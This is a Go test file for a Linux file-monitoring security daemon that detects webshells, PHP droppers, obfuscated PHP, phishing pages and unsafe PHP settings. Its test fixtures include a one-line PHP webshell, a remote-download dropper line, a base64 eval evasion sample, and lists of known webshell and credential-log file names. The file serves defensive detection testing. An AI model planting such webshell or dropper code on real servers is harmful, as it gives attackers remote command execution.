//go:build linux

package daemon

import (
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
)

// Deeper coverage for fanotify.go helpers. Focuses on branches not touched
// by fanotify_methods_linux_test.go, fanotify_helpers_linux_test.go, or
// fanotify_coverage_linux_test.go.

// --- isInteresting: additional unique branches ---------------------------

func TestIsInterestingMoreBranches(t *testing.T) {
	fm := newTestFileMonitor(t)

	cases := []struct {
		path string
		want bool
		desc string
	}{
		// .htaccess in any location
		{"/home/a/public_html/.htaccess", true, "htaccess /home"},
		{"/srv/something/.htaccess", true, "htaccess elsewhere"},
		// credential log names outside /home
		{"/opt/results.txt", true, "credential log basename anywhere"},
		// executables in /var/tmp
		{"/var/tmp/miner", true, "var/tmp path"},
		// non-php in sensitive dirs - should NOT be interesting (branch requires PHP ext)
		{"/home/a/.ssh/authorized_keys", false, "non-php in .ssh"},
		{"/home/a/mail/new/1234", false, "non-php in mail"},
		// html outside /home - uninteresting
		{"/tmp/page.html", true, "html in /tmp (caught by /tmp path rule)"},
		{"/opt/www/index.htm", false, "htm outside /home and /tmp"},
		// CGI in /tmp - falls through to /tmp rule (interesting)
		{"/tmp/attacker.pl", true, "perl in /tmp still interesting"},
	}

	for _, tc := range cases {
		got := fm.isInteresting(tc.path)
		if got != tc.want {
			t.Errorf("%s: isInteresting(%q) = %v, want %v", tc.desc, tc.path, got, tc.want)
		}
	}
}

// --- matchSuppression: unusual glob patterns -----------------------------

func TestMatchSuppressionEdges(t *testing.T) {
	cases := []struct {
		pattern, path string
		want          bool
	}{
		// trailing slash pattern
		{"*/vendor/*", "/home/a/wp-content/plugins/x/vendor/y/file.php", true},
		// no wildcard, full-path equal
		{"/etc/passwd", "/etc/passwd", true},
		// pattern with no slashes but path has slashes (basename match)
		{"error.log", "/var/log/error.log", true},
		// wildcard single-segment
		{"/home/*/tmp", "/home/alice/tmp", true},
		// non-matching
		{"*/vendor/*", "/home/a/plugins/x/y.php", false},
		// pattern with empty segments (leading slash creates empty split[0])
		{"/cache/*", "/cache/file.php", true},
		// completely unrelated
		{"*.log", "/home/a/x.php", false},
	}

	for _, tc := range cases {
		if got := matchSuppression(tc.pattern, tc.path); got != tc.want {
			t.Errorf("matchSuppression(%q, %q) = %v, want %v", tc.pattern, tc.path, got, tc.want)
		}
	}
}

// --- looksLikePluginUpdate: path without uploads segment -----------------

func TestLooksLikePluginUpdateNoUploads(t *testing.T) {
	if looksLikePluginUpdate("/home/a/something/else/file.php") {
		t.Error("path without uploads should not match")
	}
}

// --- looksLikePluginUpdate: single file under uploads (no subdir) --------

func TestLooksLikePluginUpdateFlatFile(t *testing.T) {
	// path has uploads but no trailing slash after the name means no subdir
	if looksLikePluginUpdate("/home/a/wp-content/uploads/direct.php") {
		t.Error("uploads/<file>.php (no subdir) should not be a plugin update")
	}
}

// --- looksLikePluginUpdate: caching behavior ------------------------------

func TestLooksLikePluginUpdateCache(t *testing.T) {
	// Build a fake WP root where the plugin dir exists.
	dir := t.TempDir()
	wpRoot := dir
	pluginName := "test-plugin"
	if err := os.MkdirAll(wpRoot+"/wp-content/plugins/"+pluginName, 0755); err != nil {
		t.Fatal(err)
	}

	// Expect looksLikePluginUpdate to stat the plugin dir and cache "exists=true".
	p := wpRoot + "/wp-content/uploads/" + pluginName + "_abc12/file.php"
	if !looksLikePluginUpdate(p) {
		t.Error("plugin dir exists - should be true")
	}

	// Second call should hit the cache (no filesystem access needed).
	if !looksLikePluginUpdate(p) {
		t.Error("second call should return cached true")
	}
}

// --- credentialLogNames map covers key entries ---------------------------

func TestCredentialLogNamesMap(t *testing.T) {
	mustHave := []string{
		"results.txt", "log.txt", "emails.txt", "data.txt",
		"passwords.txt", "creds.txt", "credentials.txt",
		"results.log", "emails.csv",
	}
	for _, name := range mustHave {
		if !credentialLogNames[name] {
			t.Errorf("credentialLogNames missing %q", name)
		}
	}
	if credentialLogNames["benign.txt"] {
		t.Error("benign.txt should not be in map")
	}
}

// --- knownWebshells covers representative entries ------------------------

func TestKnownWebshellsMap(t *testing.T) {
	mustHave := []string{"c99.php", "r57.php", "wso.php", "shell.php", "backdoor.php"}
	for _, name := range mustHave {
		if !knownWebshells[name] {
			t.Errorf("knownWebshells missing %q", name)
		}
	}
	if knownWebshells["index.php"] {
		t.Error("index.php should NOT be in webshells map")
	}
}

// --- containsFunc: no-match short-circuit --------------------------------

func TestContainsFuncNoMatchEmpty(t *testing.T) {
	if containsFunc("", "exec(") {
		t.Error("empty content should not match")
	}
}

func TestContainsFuncMultipleEmbeddedAllFalse(t *testing.T) {
	// Every occurrence is embedded (preceded by a letter), so it must not match.
	if containsFunc("xexec( yexec( zexec(", "exec(") {
		t.Error("all occurrences embedded - should not match")
	}
}

// --- runSignatureScan: nil scanner path ----------------------------------

func TestRunSignatureScanReturnsFalseWithoutScanners(t *testing.T) {
	// With no signature/YARA scanners registered (default in tests), it
	// should simply return false and not panic.
	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}

	got := fm.runSignatureScan([]byte("<?php echo 1; ?>"), "/tmp/x.php", ".php", "pi")
	if got {
		t.Error("runSignatureScan should return false with no scanners")
	}
	select {
	case f := <-ch:
		t.Errorf("no alert expected, got %+v", f)
	default:
	}
}

// --- checkHTMLPhishing: oversized file is skipped ------------------------

func TestCheckHTMLPhishingOversizedSkipped(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "big.html")
	// Exceed the 500_000-byte cap.
	big := make([]byte, 600000)
	for i := range big {
		big[i] = 'a'
	}
	if err := os.WriteFile(path, big, 0644); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)

	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	// Path inside public_html to get past the prefix guard.
	fm.checkHTMLPhishing(fd, "/home/a/public_html/big.html", "pi")

	select {
	case a := <-ch:
		t.Errorf("oversized file should be skipped, got %+v", a)
	default:
	}
}

// --- checkHTMLPhishing: credential form without brand keyword is skipped --

func TestCheckHTMLPhishingNoBrand(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "login.html")
	body := `<!DOCTYPE html><html><body>` +
		strings.Repeat("padding ", 80) +
		`<form action="/submit">
<input type="email" name="email">
<input type="password" name="password">
</form></body></html>`
	if err := os.WriteFile(path, []byte(body), 0644); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)

	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkHTMLPhishing(fd, "/home/a/public_html/login.html", "pi")

	select {
	case a := <-ch:
		if a.Check == "phishing_realtime" {
			t.Errorf("no-brand page should not trigger phishing_realtime: %+v", a)
		}
	default:
	}
}

// --- checkHTMLPhishing: brand+creds but no exfil/trust - no alert ---------

func TestCheckHTMLPhishingBrandNoExfil(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "login.html")
	body := `<!DOCTYPE html><html><body>
<h1>Microsoft 365 Login</h1>` + strings.Repeat("padding ", 80) +
		`<form action="/submit">
<input type="email" name="email">
<input type="password" name="password">
</form></body></html>`
	if err := os.WriteFile(path, []byte(body), 0644); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)

	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkHTMLPhishing(fd, "/home/a/public_html/login.html", "pi")

	select {
	case a := <-ch:
		if a.Check == "phishing_realtime" {
			t.Errorf("no exfil/trust badge - should not alert phishing_realtime: %+v", a)
		}
	default:
	}
}

// --- checkPHPContent: GitHub raw + dangerous function on same line -------

func TestCheckPHPContentGithubDropper(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "x.php")
	body := "<?php $u = 'https://raw.githubusercontent.com/x/y/main/z'; file_put_contents('out', file_get_contents($u)); ?>"
	if err := os.WriteFile(path, []byte(body), 0644); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)

	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkPHPContent(fd, path, "pi")

	select {
	case a := <-ch:
		if a.Check != "php_dropper_realtime" {
			t.Errorf("check = %q, want php_dropper_realtime", a.Check)
		}
	default:
		t.Error("expected php_dropper_realtime alert")
	}
}

// --- checkPHPContent: fragmented base64 evasion --------------------------

func TestCheckPHPContentFragmentedBase64(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "x.php")
	body := `<?php $a = "base"; $b = "64_decode"; $c = $a . $b; eval($c("ZWNobyAxOw==")); ?>`
	if err := os.WriteFile(path, []byte(body), 0644); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)

	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkPHPContent(fd, path, "pi")

	select {
	case a := <-ch:
		if a.Check != "obfuscated_php_realtime" {
			t.Errorf("check = %q, want obfuscated_php_realtime", a.Check)
		}
	default:
		t.Error("expected obfuscated_php_realtime alert")
	}
}

// --- checkPHPContent: webshell pattern (shell func + request var) --------

func TestCheckPHPContentWebshellSameLine(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "x.php")
	body := `<?php system($_POST['cmd']); ?>`
	if err := os.WriteFile(path, []byte(body), 0644); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)

	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkPHPContent(fd, path, "pi")

	select {
	case a := <-ch:
		if a.Check != "webshell_content_realtime" {
			t.Errorf("check = %q, want webshell_content_realtime", a.Check)
		}
	default:
		t.Error("expected webshell_content_realtime alert")
	}
}

// --- checkPHPContent: WP_Filesystem context is excluded ------------------

func TestCheckPHPContentWPFilesystemExcluded(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "x.php")
	// shell + request-input + WP_Filesystem present -> suppressed.
	body := `<?php
global $wp_filesystem;
WP_Filesystem();
$out = shell_exec('ls');
echo $_POST['foo'];
?>`
	if err := os.WriteFile(path, []byte(body), 0644); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)

	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkPHPContent(fd, path, "pi")

	select {
	case a := <-ch:
		if a.Check == "webshell_content_realtime" {
			t.Errorf("WP_Filesystem context should suppress webshell_content_realtime: %+v", a)
		}
	default:
	}
}

// --- checkUserINI: allow_url_include set to off should NOT alert ---------

func TestCheckUserINIAllowURLIncludeOff(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, ".user.ini")
	if err := os.WriteFile(path, []byte("allow_url_include = Off\n"), 0644); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)

	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkUserINI(fd, path, "pi")

	select {
	case a := <-ch:
		if a.Check == "php_config_realtime" {
			t.Errorf("allow_url_include=Off should not alert: %+v", a)
		}
	default:
	}
}

// --- checkUserINI: allow_url_include = 1 (numeric truthy) ----------------

func TestCheckUserINIAllowURLIncludeOne(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, ".user.ini")
	if err := os.WriteFile(path, []byte("allow_url_include = 1\n"), 0644); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)

	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkUserINI(fd, path, "pi")

	select {
	case a := <-ch:
		if a.Check != "php_config_realtime" {
			t.Errorf("check = %q, want php_config_realtime", a.Check)
		}
	default:
		t.Error("expected php_config_realtime alert for allow_url_include=1")
	}
}

// --- checkUserINI: disable_functions with real functions - no alert ------

func TestCheckUserINIDisableFunctionsPopulated(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, ".user.ini")
	if err := os.WriteFile(path, []byte("disable_functions = exec,system,passthru\n"), 0644); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)

	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkUserINI(fd, path, "pi")

	select {
	case a := <-ch:
		if a.Check == "php_config_realtime" {
			t.Errorf("populated disable_functions should not alert: %+v", a)
		}
	default:
	}
}

// --- checkHtaccess: invalid fd returns early -----------------------------

func TestCheckHtaccessInvalidFd(t *testing.T) {
	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkHtaccess(-1, "/home/a/public_html/.htaccess", "pi")
	select {
	case a := <-ch:
		t.Errorf("invalid fd should not emit alerts, got %+v", a)
	default:
	}
}

// --- checkUserINI: invalid fd returns early ------------------------------

func TestCheckUserINIInvalidFd(t *testing.T) {
	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkUserINI(-1, "/home/a/.user.ini", "pi")
	select {
	case a := <-ch:
		t.Errorf("invalid fd should not emit alerts, got %+v", a)
	default:
	}
}

// --- checkPHPContent: invalid fd returns early ---------------------------

func TestCheckPHPContentInvalidFd(t *testing.T) {
	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkPHPContent(-1, "/tmp/x.php", "pi")
	select {
	case a := <-ch:
		t.Errorf("invalid fd should not emit alerts, got %+v", a)
	default:
	}
}

// --- checkCGIBackdoor: invalid fd returns early --------------------------

func TestCheckCGIBackdoorInvalidFd(t *testing.T) {
	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkCGIBackdoor(-1, "/home/a/public_html/x.cgi", "pi")
	select {
	case a := <-ch:
		t.Errorf("invalid fd should not emit alerts, got %+v", a)
	default:
	}
}

// --- dedup map state ------------------------------------------------------

func TestShouldAlertDedupMapGrowsThenEvicts(t *testing.T) {
	fm := newTestFileMonitor(t)

	// Insert three different paths.
	fm.shouldAlert("c", "/a.php")
	fm.shouldAlert("c", "/b.php")
	fm.shouldAlert("c", "/c.php")

	count := 0
	fm.alertDedup.Range(func(k, v any) bool {
		count++
		return true
	})
	if count < 3 {
		t.Errorf("expected >=3 dedup entries, got %d", count)
	}

	// Force-expire all and re-alert - entries get refreshed.
	fm.alertDedup.Range(func(k, _ any) bool {
		fm.alertDedup.Store(k, time.Now().Add(-2*alertDedupTTL))
		return true
	})

	if !fm.shouldAlert("c", "/a.php") {
		t.Error("expired entry should allow re-alert")
	}
}

// --- droppedEvents / droppedAlerts counters are independent --------------

func TestDroppedCountersIndependent(t *testing.T) {
	ch := make(chan alert.Finding, 1)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}

	// Fill the channel, then trigger two more sendAlert calls.
	fm.sendAlert(alert.High, "x", "m", "d") // fills the channel
	fm.sendAlert(alert.High, "x", "m", "d") // dropped
	fm.sendAlert(alert.High, "x", "m", "d") // dropped

	if atomic.LoadInt64(&fm.droppedAlerts) != 2 {
		t.Errorf("droppedAlerts = %d, want 2", atomic.LoadInt64(&fm.droppedAlerts))
	}
	if atomic.LoadInt64(&fm.droppedEvents) != 0 {
		t.Errorf("droppedEvents should remain 0, got %d", atomic.LoadInt64(&fm.droppedEvents))
	}
}

// --- sendAlert carries Timestamp field -----------------------------------

func TestSendAlertSetsTimestamp(t *testing.T) {
	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}

	before := time.Now()
	fm.sendAlert(alert.Warning, "chk", "msg", "det")
	after := time.Now()

	select {
	case f := <-ch:
		if f.Timestamp.Before(before) || f.Timestamp.After(after) {
			t.Errorf("Timestamp %v outside [%v,%v]", f.Timestamp, before, after)
		}
	default:
		t.Fatal("alert not delivered")
	}
}

// --- sendAlertWithPath also carries ProcessInfo --------------------------

func TestSendAlertWithPathProcessInfo(t *testing.T) {
	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.sendAlertWithPath(alert.Critical, "chk", "msg", "det", "/x.php", "pid=1 cmd=php uid=33")

	select {
	case f := <-ch:
		if f.ProcessInfo != "pid=1 cmd=php uid=33" {
			t.Errorf("ProcessInfo = %q", f.ProcessInfo)
		}
	default:
		t.Fatal("alert not delivered")
	}
}

// --- metadataSize matches the fanotifyEventMetadata struct size ----------

func TestFanotifyMetadataSize(t *testing.T) {
	// EventLen(4) + Vers(1) + Reserved(1) + MetadataLen(2) + Mask(8) + Fd(4) + Pid(4) = 24
	if metadataSize != 24 {
		t.Errorf("metadataSize = %d, want 24", metadataSize)
	}
}

// --- constants distinct, non-zero ----------------------------------------

func TestFanotifyConstantsAreDistinct(t *testing.T) {
	vals := []uint32{FAN_MARK_ADD, FAN_MARK_MOUNT, FAN_CLOSE_WRITE, FAN_CREATE, FAN_CLOEXEC, FAN_NONBLOCK}
	// At least: none zero
	for i, v := range vals {
		if v == 0 {
			t.Errorf("constant index %d is zero", i)
		}
	}
	// FAN_CLASS_NOTIF is defined to be 0 (default class).
	if FAN_CLASS_NOTIF != 0 {
		t.Errorf("FAN_CLASS_NOTIF = %d, want 0", FAN_CLASS_NOTIF)
	}
}
